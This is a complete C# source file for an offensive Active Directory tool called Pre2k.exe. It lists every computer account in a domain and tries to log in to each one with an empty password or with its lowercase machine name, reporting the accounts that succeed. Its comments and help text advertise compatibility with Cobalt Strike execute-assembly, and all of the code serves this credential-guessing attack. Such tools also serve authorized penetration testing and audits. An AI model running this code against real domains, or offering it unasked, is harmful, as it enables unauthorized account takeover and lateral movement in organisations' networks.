using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.Runtime.InteropServices;

/// <summary>
/// Pre-Windows 2000 compatible computer account vulnerability scanner.
/// Queries Active Directory for ALL computer accounts and tests for weak authentication.
/// Compatible with Cobalt Strike execute-assembly.
/// </summary>
namespace Pre2kScanner
{
    /// <summary>
    /// Represents a computer account discovered in Active Directory.
    /// </summary>
    internal class ComputerAccount
    {
        public string SAMAccountName { get; set; }
        public string DNSHostName { get; set; }
        public int UserAccountControl { get; set; }

        public ComputerAccount(string samAccountName, string dnsHostName, int userAccountControl)
        {
            SAMAccountName = samAccountName;
            DNSHostName = dnsHostName;
            UserAccountControl = userAccountControl;
        }
    }

    /// <summary>
    /// Scanner for pre-Windows 2000 compatible computer accounts.
    /// </summary>
    internal class Scanner
    {
        private readonly string _domainPath;
        private readonly string _domainForAuth;
        private readonly bool _emptyOnly;
        private readonly bool _nameOnly;
        private readonly string _username;
        private readonly string _password;
        private readonly int _timeoutSeconds;

        /// <summary>
        /// Initializes a new instance of the Scanner class.
        /// </summary>
        /// <param name="domainPath">LDAP path to the domain</param>
        /// <param name="domainForAuth">Domain name for authentication</param>
        /// <param name="emptyOnly">Only test empty passwords</param>
        /// <param name="nameOnly">Only test machine name passwords</param>
        /// <param name="username">Optional custom username for domain operations</param>
        /// <param name="password">Optional custom password for domain operations</param>
        /// <param name="timeoutSeconds">Timeout in seconds for authentication attempts</param>
        public Scanner(string domainPath, string domainForAuth, bool emptyOnly, bool nameOnly, string username = null, string password = null, int timeoutSeconds = 10)
        {
            _domainPath = domainPath;
            _domainForAuth = domainForAuth;
            _emptyOnly = emptyOnly;
            _nameOnly = nameOnly;
            _username = username;
            _password = password;
            _timeoutSeconds = timeoutSeconds;
        }

        /// <summary>
        /// Queries Active Directory for ALL computer accounts.
        /// </summary>
        /// <returns>List of computer accounts</returns>
        public List<ComputerAccount> QueryComputers()
        {
            var computers = new List<ComputerAccount>();

            Console.WriteLine("[*] Querying domain for computer accounts...");

            DirectoryEntry directoryEntry;
            if (!string.IsNullOrEmpty(_username) && !string.IsNullOrEmpty(_password))
            {
                directoryEntry = new DirectoryEntry(_domainPath, _username, _password);
            }
            else
            {
                directoryEntry = new DirectoryEntry(_domainPath);
            }

            using (directoryEntry)
            using (var searcher = new DirectorySearcher(directoryEntry))
            {
                // LDAP filter for ALL computer accounts
                // Pre-Windows 2000 compatible computers don't have a reliable flag - we must test all computers
                searcher.Filter = "(&(objectCategory=computer)(objectClass=computer))";
                searcher.PageSize = 1000;
                searcher.PropertiesToLoad.Add("sAMAccountName");
                searcher.PropertiesToLoad.Add("dNSHostName");
                searcher.PropertiesToLoad.Add("userAccountControl");

                using (var results = searcher.FindAll())
                {
                    foreach (SearchResult result in results)
                    {
                        var samAccountName = result.Properties["sAMAccountName"].Count > 0
                            ? (string)result.Properties["sAMAccountName"][0]
                            : null;

                        var dnsHostName = result.Properties["dNSHostName"].Count > 0
                            ? (string)result.Properties["dNSHostName"][0]
                            : null;

                        var userAccountControl = result.Properties["userAccountControl"].Count > 0
                            ? (int)result.Properties["userAccountControl"][0]
                            : 0;

                        if (!string.IsNullOrEmpty(samAccountName))
                        {
                            computers.Add(new ComputerAccount(samAccountName, dnsHostName, userAccountControl));
                        }
                    }
                }
            }

            Console.WriteLine("[+] Found {0} computer accounts", computers.Count);

            return computers;
        }

        /// <summary>
        /// Tests authentication with given credentials with timeout support.
        /// </summary>
        /// <param name="username">Username for authentication</param>
        /// <param name="password">Password for authentication</param>
        /// <returns>True if authentication succeeds, false otherwise</returns>
        public bool TestAuthentication(string username, string password)
        {
            try
            {
                var authTask = System.Threading.Tasks.Task.Run(() =>
                {
                    try
                    {
                        using (var directoryEntry = new DirectoryEntry(_domainPath, username, password))
                        {
                            directoryEntry.AuthenticationType = AuthenticationTypes.Secure;
                            var nativeObject = directoryEntry.NativeObject;
                            return true;
                        }
                    }
                    catch
                    {
                        return false;
                    }
                });

                if (authTask.Wait(TimeSpan.FromSeconds(_timeoutSeconds)))
                {
                    return authTask.Result;
                }
                else
                {
                    return false;
                }
            }
            catch (COMException)
            {
                return false;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// Validates that provided credentials can connect to the domain.
        /// </summary>
        /// <returns>True if credentials are valid, false otherwise</returns>
        public bool ValidateCredentials()
        {
            if (string.IsNullOrEmpty(_username) || string.IsNullOrEmpty(_password))
            {
                return true;
            }

            try
            {
                Console.WriteLine("[*] Validating custom credentials...");

                using (var directoryEntry = new DirectoryEntry(_domainPath, _username, _password))
                {
                    var nativeObject = directoryEntry.NativeObject;
                }

                Console.WriteLine("[+] Credentials validated successfully");
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] ERROR: Failed to validate custom credentials: {0}", ex.Message);
                Console.WriteLine("[!] Ensure the username and password are correct and have domain access");
                return false;
            }
        }

        /// <summary>
        /// Generates machine password from SAM account name.
        /// </summary>
        /// <param name="samAccountName">SAM account name</param>
        /// <returns>Machine password (lowercase, first 14 chars)</returns>
        public static string GetMachinePassword(string samAccountName)
        {
            // Remove trailing $ if present
            var machineName = samAccountName.TrimEnd('$');

            // Take first 14 characters and convert to lowercase
            var length = Math.Min(14, machineName.Length);
            return machineName.Substring(0, length).ToLower();
        }

        /// <summary>
        /// Scans computers for vulnerable authentication.
        /// </summary>
        /// <param name="computers">List of computers to scan</param>
        /// <returns>Number of vulnerable accounts found</returns>
        public int ScanComputers(List<ComputerAccount> computers)
        {
            if (computers.Count == 0)
            {
                Console.WriteLine("[*] No computer accounts found");
                return 0;
            }

            var vulnerableCount = 0;
            var totalComputers = computers.Count;

            // Phase 1: Test empty passwords
            if (!_nameOnly)
            {
                Console.WriteLine("[*] Phase 1: Testing empty passwords on {0} computer accounts...", totalComputers);
                var progressCounter = 0;

                foreach (var computer in computers)
                {
                    progressCounter++;

                    // Update progress every 50 computers or on last computer
                    if (progressCounter % 50 == 0 || progressCounter == totalComputers)
                    {
                        Console.WriteLine("[*] Progress (Empty Password): {0}/{1}", progressCounter, totalComputers);
                    }

                    var authUsername = string.Format("{0}\\{1}", _domainForAuth, computer.SAMAccountName);

                    if (TestAuthentication(authUsername, string.Empty))
                    {
                        Console.WriteLine("[!] SUCCESS: {0} - Empty password", computer.SAMAccountName);
                        vulnerableCount++;
                    }
                }
            }

            // Phase 2: Test machine name passwords
            if (!_emptyOnly)
            {
                Console.WriteLine("[*] Phase 2: Testing machine name passwords on {0} computer accounts...", totalComputers);
                var progressCounter = 0;

                foreach (var computer in computers)
                {
                    progressCounter++;

                    // Update progress every 50 computers or on last computer
                    if (progressCounter % 50 == 0 || progressCounter == totalComputers)
                    {
                        Console.WriteLine("[*] Progress (Machine Name Password): {0}/{1}", progressCounter, totalComputers);
                    }

                    var authUsername = string.Format("{0}\\{1}", _domainForAuth, computer.SAMAccountName);
                    var machinePassword = GetMachinePassword(computer.SAMAccountName);

                    if (TestAuthentication(authUsername, machinePassword))
                    {
                        Console.WriteLine("[!] SUCCESS: {0} - Password matches machine name", computer.SAMAccountName);
                        vulnerableCount++;
                    }
                }
            }

            return vulnerableCount;
        }
    }

    /// <summary>
    /// Program entry point.
    /// </summary>
    class Program
    {
        /// <summary>
        /// Displays help information.
        /// </summary>
        private static void ShowHelp()
        {
            Console.WriteLine("Pre2k.exe - Pre-Windows 2000 Compatible Computer Account Scanner");
            Console.WriteLine();
            Console.WriteLine("DESCRIPTION:");
            Console.WriteLine("  Queries Active Directory for ALL computer accounts and tests for weak");
            Console.WriteLine("  authentication commonly found in pre-Windows 2000 compatible accounts,");
            Console.WriteLine("  using empty passwords or passwords matching the lowercase machine name");
            Console.WriteLine("  (first 14 characters).");
            Console.WriteLine();
            Console.WriteLine("USAGE:");
            Console.WriteLine("  Pre2k.exe [options]");
            Console.WriteLine();
            Console.WriteLine("OPTIONS:");
            Console.WriteLine("  /emptyonly              Only test empty passwords");
            Console.WriteLine("  /nameonly               Only test machine name passwords");
            Console.WriteLine("  /username:<username>    Custom username for domain operations");
            Console.WriteLine("  /password:<password>    Custom password for domain operations");
            Console.WriteLine("  /domain:<domain>        Custom domain (default: current domain)");
            Console.WriteLine("  /timeout:<seconds>      Timeout per auth attempt (default: 10)");
            Console.WriteLine("  /help, /?               Show this help message");
            Console.WriteLine();
            Console.WriteLine("EXAMPLES:");
            Console.WriteLine("  Pre2k.exe");
            Console.WriteLine("  Pre2k.exe /emptyonly");
            Console.WriteLine("  Pre2k.exe /nameonly");
            Console.WriteLine("  Pre2k.exe /domain:contoso.com");
            Console.WriteLine();
            Console.WriteLine("NOTES:");
            Console.WriteLine("  - Requires network access to Active Directory");
            Console.WriteLine("  - Requires sufficient permissions to query computer objects");
            Console.WriteLine("  - Compatible with Cobalt Strike execute-assembly");
        }

        /// <summary>
        /// Gets the LDAP domain path.
        /// </summary>
        /// <param name="domainName">Optional domain name</param>
        /// <param name="username">Optional username for authentication</param>
        /// <param name="password">Optional password for authentication</param>
        /// <returns>LDAP domain path</returns>
        private static string GetDomainPath(string domainName, string username = null, string password = null)
        {
            if (string.IsNullOrWhiteSpace(domainName))
            {
                DirectoryEntry rootDSE;
                if (!string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
                {
                    rootDSE = new DirectoryEntry("LDAP://RootDSE", username, password);
                }
                else
                {
                    rootDSE = new DirectoryEntry("LDAP://RootDSE");
                }

                using (rootDSE)
                {
                    var domainDN = rootDSE.Properties["defaultNamingContext"].Value.ToString();
                    return string.Format("LDAP://{0}", domainDN);
                }
            }
            else
            {
                // Convert domain name to DN format
                var domainDN = "DC=" + domainName.Replace(".", ",DC=");
                return string.Format("LDAP://{0}", domainDN);
            }
        }

        /// <summary>
        /// Extracts domain name from LDAP path.
        /// </summary>
        /// <param name="domainPath">LDAP domain path</param>
        /// <returns>Domain name</returns>
        private static string ExtractDomainName(string domainPath)
        {
            var dn = domainPath.Replace("LDAP://", "");
            var parts = dn.Split(new[] { ",DC=" }, StringSplitOptions.None);
            var domainParts = new List<string>();

            foreach (var part in parts)
            {
                domainParts.Add(part.Replace("DC=", ""));
            }

            return string.Join(".", domainParts);
        }

        /// <summary>
        /// Main entry point.
        /// </summary>
        /// <param name="args">Command line arguments</param>
        /// <returns>Exit code (0 = success, 1 = error)</returns>
        static int Main(string[] args)
        {
            try
            {
                var emptyOnly = false;
                var nameOnly = false;
                var username = string.Empty;
                var password = string.Empty;
                var domain = string.Empty;
                var timeoutSeconds = 10;

                // Parse command line arguments
                foreach (var arg in args)
                {
                    var argLower = arg.ToLower();

                    if (argLower == "/help" || argLower == "/?")
                    {
                        ShowHelp();
                        return 0;
                    }
                    else if (argLower == "/emptyonly")
                    {
                        emptyOnly = true;
                    }
                    else if (argLower == "/nameonly")
                    {
                        nameOnly = true;
                    }
                    else if (argLower.StartsWith("/username:"))
                    {
                        username = arg.Substring(10);
                    }
                    else if (argLower.StartsWith("/password:"))
                    {
                        password = arg.Substring(10);
                    }
                    else if (argLower.StartsWith("/domain:"))
                    {
                        domain = arg.Substring(8);
                    }
                    else if (argLower.StartsWith("/timeout:"))
                    {
                        if (!int.TryParse(arg.Substring(9), out timeoutSeconds) || timeoutSeconds <= 0)
                        {
                            Console.WriteLine("[!] ERROR: Invalid timeout value. Must be a positive integer.");
                            return 1;
                        }
                    }
                    else
                    {
                        Console.WriteLine("[!] ERROR: Unknown argument: {0}", arg);
                        Console.WriteLine("Use /help or /? for usage information");
                        return 1;
                    }
                }

                // Validate mutually exclusive parameters
                if (emptyOnly && nameOnly)
                {
                    Console.WriteLine("[!] ERROR: Cannot specify both /emptyonly and /nameonly");
                    return 1;
                }

                // Validate Username and Password are used together
                if ((!string.IsNullOrEmpty(username) && string.IsNullOrEmpty(password)) ||
                    (string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password)))
                {
                    Console.WriteLine("[!] ERROR: /username and /password must be specified together");
                    return 1;
                }

                // Get domain path
                var domainPath = GetDomainPath(domain, username, password);

                // Extract domain name for authentication
                var domainForAuth = string.IsNullOrWhiteSpace(domain)
                    ? ExtractDomainName(domainPath)
                    : domain;

                // Create scanner with credentials
                var scanner = new Scanner(domainPath, domainForAuth, emptyOnly, nameOnly, username, password, timeoutSeconds);

                // Validate credentials if provided
                if (!scanner.ValidateCredentials())
                {
                    return 1;
                }

                // Query computers
                var computers = scanner.QueryComputers();

                // Scan computers
                var vulnerableCount = scanner.ScanComputers(computers);

                Console.WriteLine("[+] Scan complete. {0} vulnerable accounts found.", vulnerableCount);

                return 0;
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] ERROR: An unexpected error occurred: {0}", ex.Message);
                return 1;
            }
        }
    }
}
